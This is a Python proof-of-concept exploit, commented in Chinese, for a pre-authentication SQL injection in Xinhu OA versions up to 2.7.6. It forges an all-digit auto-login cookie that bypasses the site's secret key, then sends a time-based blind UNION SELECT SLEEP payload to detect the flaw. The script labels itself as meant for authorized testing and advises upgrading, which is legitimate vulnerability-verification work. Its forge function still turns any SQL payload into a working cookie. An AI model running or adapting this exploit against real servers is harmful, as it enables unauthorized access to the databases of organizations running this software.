#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
信呼OA(xinhu/rockoa) <= V2.7.6 自动登录Cookie前台SQL注入 漏洞验证POC

原理:
  自动登录Cookie(xinhu_mo_adminid)经系统自研可逆编码(jm)解密后
  未作过滤直接拼入SQL查询(loginModel.php autologin -> getone)。
  解密函数uncrypts()只映射字母表内字母, 数字字符原样直通;
  且chr()对超256取模256 —— 因此任意payload可编码为纯数字Cookie,
  与目标是否配置randkey无关(无密钥伪造), 前台无需任何账号。

用法:
  python3 poc.py -t http://127.0.0.1:8827

仅可用于授权测试与自建环境安全验证。
"""
import argparse
import base64
import time
import urllib.request
import urllib.error


def _seg(ch):
    """字符 -> 十进制不含'0'的(ord+256k)编码段, 服务端chr()自动%256还原"""
    o, k = ord(ch), 0
    while True:
        v = o + 256 * k
        if '0' not in str(v):
            return str(v)
        k += 1


def forge(plaintext):
    """任意payload -> 纯数字Cookie(不需要知道目标randkey)"""
    b = base64.b64encode(plaintext.encode()).decode()
    b = b.replace('+', '!').replace('/', '.').replace('=', ':')
    return '0'.join(_seg(c) for c in b) + '05'


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


OP = urllib.request.build_opener(_NoRedirect())
ENTRY = '/index.php?d=we&m=index'


def probe(base, cookie=None, timeout=20):
    rq = urllib.request.Request(base + ENTRY)
    if cookie:
        rq.add_header('Cookie', 'xinhu_mo_adminid=' + cookie)
    t0 = time.time()
    try:
        r = OP.open(rq, timeout=timeout)
        st, body = r.status, r.read()
    except urllib.error.HTTPError as e:
        st, body = e.code, e.read()
    return st, time.time() - t0, body


def main():
    ap = argparse.ArgumentParser(description='信呼OA <=2.7.6 自动登录Cookie SQL注入 验证POC')
    ap.add_argument('-t', '--target', default='http://127.0.0.1:8827', help='目标根URL')
    args = ap.parse_args()
    base = args.target.rstrip('/')
    print('[*] 目标:', base)

    # 基线: 无Cookie(正常应为跳转登录或未登录提示, 且响应迅速)
    st0, el0, body0 = probe(base)
    print(f'[*] 基线请求: HTTP {st0}, {el0:.2f}s')

    # 注入: UNION SELECT SLEEP(3) -> 存在漏洞则响应延迟约3秒
    payload = "zz' UNION SELECT IF((1=1),SLEEP(3),0),'a',9,1#"
    st1, el1, body1 = probe(base, forge(payload))
    print(f'[*] 注入请求: HTTP {st1}, {el1:.2f}s')

    vulnerable = el1 - el0 >= 2.0
    if vulnerable:
        print('[+] 存在SQL注入(时间盲注延迟 %.1fs), 建议尽快升级至V2.7.7+' % el1)
        raise SystemExit(0)
    print('[-] 未观察到注入延迟(%.2fs), 目标可能已修复或不可达' % el1)
    raise SystemExit(1)


if __name__ == '__main__':
    main()
